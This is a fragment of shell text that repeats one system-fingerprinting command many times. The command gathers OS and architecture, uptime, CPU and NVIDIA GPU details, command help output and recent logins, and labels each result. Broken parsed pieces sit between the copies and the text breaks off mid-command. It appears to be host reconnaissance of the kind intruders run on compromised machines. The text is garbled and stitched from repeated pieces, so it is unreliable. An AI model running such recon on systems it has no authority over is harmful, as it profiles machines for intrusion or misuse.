-i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		